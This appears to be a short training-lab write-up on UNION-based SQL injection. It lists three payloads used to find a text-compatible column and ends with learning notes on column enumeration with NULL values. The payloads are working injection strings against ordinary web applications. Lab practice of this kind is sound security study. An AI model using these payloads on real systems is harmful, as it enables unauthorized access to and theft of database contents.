# Payloads Used

## Invalid Payload

```sql
' UNION SELECT 'abcd',NULL--
```

---

## Valid Payload

```sql
' UNION SELECT NULL,'abcd'--
```

---

## Final Payload

```sql
' UNION SELECT NULL,'YOUR-LAB-STRING'--
```

---

# Key Learning

- UNION-based SQL Injection requires the correct number of columns.
- Text values must be placed into a compatible column.
- NULL values simplify column enumeration because they are compatible with most SQL data types.
- Successfully identifying a text-compatible column is a prerequisite for extracting sensitive information using UNION-based attacks.

